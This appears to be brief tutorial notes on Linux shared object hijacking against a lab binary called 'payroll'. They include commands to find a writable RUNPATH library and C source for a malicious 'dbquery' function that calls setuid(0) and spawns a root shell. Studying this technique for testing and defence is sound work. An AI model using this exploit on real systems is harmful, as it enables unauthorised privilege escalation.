# Shared Object Hijacking
Identifying the binarie "payroll"
1. See libraries related to
```
ldd payroll

# Output
linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)

# OR

readelf -d payroll  | grep PATH

# Output
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

2. Find the code's flow
```
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

3. Now we have to create a malicious function with the name "dbquery"
```
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

4. Execute
```
gcc src.c -fPIC -shared -o /development/libshared.so

# Then execute the binarie
./payroll 
```
